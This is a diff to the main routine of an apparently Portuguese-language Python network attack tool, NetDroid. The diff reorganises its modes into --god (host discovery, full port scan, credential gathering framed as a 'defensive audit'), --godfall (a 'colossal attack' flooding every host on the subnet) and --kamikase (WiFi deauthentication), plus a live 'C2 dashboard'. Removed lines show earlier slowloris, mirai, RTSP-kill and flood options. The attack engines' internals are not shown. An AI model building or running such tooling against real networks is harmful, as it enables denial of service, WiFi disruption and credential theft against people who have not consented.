+        ui.info("Use UM (ou mais) destes 3 modos:")
+        ui.info("  --god       → reconhecimento + scan total + auditoria defensiva")
+        ui.info("  --godfall   → ataque colossal a todos os hosts da rede")
+        ui.info("  --kamikase  → deauth WiFi 802.11 (exige --root)")
         return
+
+    # ── --live só faz sentido com --god ou --kamikase ────
+    if args.live and not (args.god or args.kamikase):
+        ui.error("--live só funciona com --god ou --kamikase.")
+        ui.info("Exemplo: python NetDroid.py --auto --god --live")
+        return
+
+    # ── inicia dashboard C2 se --live presente ────────────
+    dashboard: Optional[LiveDashboard] = None
+    if args.live:
+        modo_dashboard = "kamikase" if args.kamikase else "god"
+        dashboard = LiveDashboard(ui, modo_dashboard)
+        if not dashboard.iniciar():
+            return  # Flask/SocketIO ausentes
+
+    # ── ativar privilege mode (--root) ────────
+    global ctx_priv
+    if args.root:
+        ctx_priv = ContextoPrivilegio.detectar_e_validar(ui)
+        if ctx_priv is None:
+            return
+
+    # ── kamikase NÃO precisa de target (opera no chip WiFi local)
+    if not args.kamikase:
+        if not args.auto and not args.t:
+            ui.error("Use --auto ou --t <target> para definir o alvo.")
+            ui.info("Exemplo: python NetDroid.py --auto --god")
+            return
 
     # ── network detection ─────────────────────
     detector = NetworkDetector(ui, target=args.t)
     if not detector.detect():
-        return
+        if args.kamikase:
+            ui.warn("Detecção de rede falhou — seguindo só com kamikase.")
+            detector.ssid = "kamikase"
+            detector.output_dir = Path(f"kamikase_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
+            try:
+                detector.output_dir.mkdir(parents=True, exist_ok=True)
+            except Exception:
+                detector.output_dir = Path(".")
+        else:
+            return
 
     hosts: List[Dict[str, Any]] = []
     stress_results: Dict = {}
     god_data: Dict = {}
 
-    # ── discover ──────────────────────────────
-    if args.discover:
+    # Modelo de host completo (usado em fallbacks e --t manual)
+    def _host_vazio(ip: str) -> Dict[str, Any]:
+        return {"ip": ip, "mac": "N/A", "vendor": "N/A", "os": "N/A",
+                "latency_ms": 0, "is_gateway": False, "ports": [], "services": {},
+                "hostname": "", "device_type": "desconhecido",
+                "fontes": [], "confiancas": {}, "vulns": [], "extra": {}}
+
+    # ─────────────────────────────────────────────────────
+    # MODO --god: descoberta total + scan completo + auditoria
+    # ─────────────────────────────────────────────────────
+    if args.god:
+        # 1) HostDiscovery (absorvido do antigo --discover)
+        ui.section("FASE 1/3 — DESCOBERTA TOTAL DE HOSTS")
         discovery = HostDiscovery(ui, detector)
         hosts = await discovery.discover()
         if not hosts:
-            ui.warn("Nenhum host encontrado. Operações subsequentes podem falhar.")
+            ui.warn("Nenhum host descoberto. Tentando alvo único do --t/gateway.")
+            if args.t:
+                try:
+                    net = ipaddress.ip_network(args.t, strict=False)
+                    if net.prefixlen == 32:
+                        hosts = [_host_vazio(args.t)]
+                    else:
+                        hosts = [_host_vazio(str(h)) for h in list(net.hosts())[:254]]
+                except ValueError:
+                    hosts = [_host_vazio(args.t)]
+            elif detector.gateway:
+                hosts = [_host_vazio(detector.gateway)]
+                hosts[0]["is_gateway"] = True
 
-    # ── handle single target without discover ─
-    if not args.discover and args.t:
+        # 2) PortScanner em modo INSANE (1-65535 + avaliação de vulns)
+        if hosts:
+            ui.section("FASE 2/3 — SCAN COMPLETO + AVALIAÇÃO DE VULNERABILIDADES")
+            scanner = PortScanner(ui, mode="insane", insane=True)
+            hosts = await scanner.scan_all(hosts)
+
+        # 3) GodMode (auditoria defensiva profunda + ONVIF integrado)
+        if hosts:
+            ui.section("FASE 3/3 — AUDITORIA DEFENSIVA PROFUNDA")
+            god = GodMode(ui, detector, hosts)
+            await god.run()
+            god_data = {
+                "creds": god.found_creds,
+                "risks": getattr(god, "risk_findings", []),
+                "ssdp": god.ssdp_devices,
+                "rtsp": god.rtsp_streams,
+                "onvif": getattr(god, "onvif_devices", []),
+            }
+
+    # ─────────────────────────────────────────────────────
+    # Hosts para --godfall (sem --god): subnet inteira como spray
+    # ─────────────────────────────────────────────────────
+    if not args.god and not hosts and args.t:
         try:
             net = ipaddress.ip_network(args.t, strict=False)
             if net.prefixlen == 32:
-                hosts = [{"ip": args.t, "mac": "N/A", "vendor": "N/A",
-                          "os": "N/A", "latency_ms": 0, "is_gateway": False,
-                          "ports": [], "services": {}}]
+                hosts = [_host_vazio(args.t)]
             else:
-                hosts = [{"ip": str(h), "mac": "N/A", "vendor": "N/A",
-                          "os": "N/A", "latency_ms": 0, "is_gateway": False,
-                          "ports": [], "services": {}}
-                         for h in list(net.hosts())[:254]]
+                hosts = [_host_vazio(str(h)) for h in list(net.hosts())[:254]]
         except ValueError:
-            hosts = [{"ip": args.t, "mac": "N/A", "vendor": "N/A",
-                      "os": "N/A", "latency_ms": 0, "is_gateway": False,
-                      "ports": [], "services": {}}]
+            hosts = [_host_vazio(args.t)]
 
-    # ── port scan ─────────────────────────────
-    scan_mode = None
-    if args.normal:
-        scan_mode = "normal"
-    elif args.Insane:
-        scan_mode = "insane"
-    elif args.stealth:
-        scan_mode = "stealth"
-    elif args.ports:
-        scan_mode = "normal"
+    if not args.god and not hosts and detector.gateway and args.godfall:
+        if detector.subnet:
+            try:
+                net = ipaddress.ip_network(detector.subnet, strict=False)
+                todos = list(net.hosts())[:254]
+                hosts = []
+                for ip_obj in todos:
+                    ip_str = str(ip_obj)
+                    h = _host_vazio(ip_str)
+                    h["ports"] = [80, 443, 8080]
+                    if ip_str == detector.gateway:
+                        h["is_gateway"] = True
+                    hosts.append(h)
+                ui.info(f"Modo --godfall sem --god: subnet inteira "
+                        f"{detector.subnet} ({len(hosts)} alvos).")
+            except Exception:
+                hosts = [_host_vazio(detector.gateway)]
+                hosts[0]["is_gateway"] = True
+                hosts[0]["ports"] = [80, 443, 8080]
 
-    if scan_mode or args.ports:
-        custom = None
-        if args.ports:
-            custom = [int(p.strip()) for p in args.ports.split(",") if p.strip().isdigit()]
-        scanner = PortScanner(ui, mode=scan_mode or "normal",
-                              custom_ports=custom, insane=args.Insane)
-        hosts = await scanner.scan_all(hosts)
-
-    # ── stress ────────────────────────────────
-    if args.overfull or args.overflow or args.flood:
-        stress = StressEngine(ui, detector, insane=args.Insane)
-        if args.flood:
-            await stress.run_flood()
-        if args.overfull:
-            await stress.run_overfull()
-        if args.overflow:
-            await stress.run_overflow()
+    # ─────────────────────────────────────────────────────
+    # MODO --godfall: ataque colossal
+    # ─────────────────────────────────────────────────────
+    if args.godfall:
+        stress = StressEngine(ui, detector, insane=True,
+                              infinito=args.infinite)
+        await stress.run_godfall(hosts)
         stress_results = stress.results
 
-    # ── god mode & advanced attacks ───────────────────────
-    if args.god or args.slowloris or args.rtsp_kill or args.onvif or args.mirai:
-        god = GodMode(ui, detector, hosts)
-        
-        if args.god:
-            # O modo God agora engloba todos os outros
-            await god.run()
-        else:
-            # Execução cirúrgica (apenas o que foi pedido)
-            if args.onvif: await god.run_onvif()
-            if args.mirai: await god.run_mirai()
-            if args.slowloris: await god.run_slowloris()
-            if args.rtsp_kill: await god.run_rtsp_kill()
-            
-        god_data = {
-            "creds": god.found_creds,
-            "ssdp": god.ssdp_devices,
-            "rtsp": god.rtsp_streams,
-            "onvif": getattr(god, "onvif_devices", [])
-        }
+    # ─────────────────────────────────────────────────────
+    # MODO --kamikase: deauth WiFi (live = 3 zonas dashboard)
+    # ─────────────────────────────────────────────────────
+    kamikase_results: Dict[str, Any] = {}
+    if args.kamikase:
+        kami = KamikaseEngine(ui, ctx_priv, detector, live=args.live)
+        if dashboard is not None:
+            dashboard.kami_engine = kami
+        await kami.run()
+        kamikase_results = kami.resultado()
 
-    # ── report ────────────────────────────────
-    if not args.flood:
-        report = ReportEngine(ui, detector, hosts, stress_results, god_data)
-        report.generate()
-    else:
-        ui.info("Opção --flood ativada. Geração de relatórios ignorada.")
+    # ── report ───────────────────────────────────────────
+    report = ReportEngine(ui, detector, hosts, stress_results, god_data,
+                          kamikase_data=kamikase_results,
+                          ctx_priv=ctx_priv)
+    report.generate()
+
+    # ── PDF executivo (se reportlab disponível) ──────────
+    if HAS_REPORTLAB and (args.god or args.kamikase):
+        PDFReport(ui).gerar(detector.output_dir or Path("."),
+                             hosts, stress_results, god_data,
+                             kamikase_results, ctx_priv)
+
+    # ── --live: aguarda Ctrl+C para encerrar dashboard ───
+    if dashboard is not None and not args.kamikase:
+        ui.info("Dashboard C2 ativo. Pressione Ctrl+C para encerrar.")
+        try:
+            while True:
+                await asyncio.sleep(1)
+        except (KeyboardInterrupt, asyncio.CancelledError):
+            ui.warn("Dashboard encerrado pelo usuário.")
 
     ui.section("COMPLETE")
     ui.success(f"Execução finalizada em {ui.elapsed()}")
@@ -2101,3 +8544,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
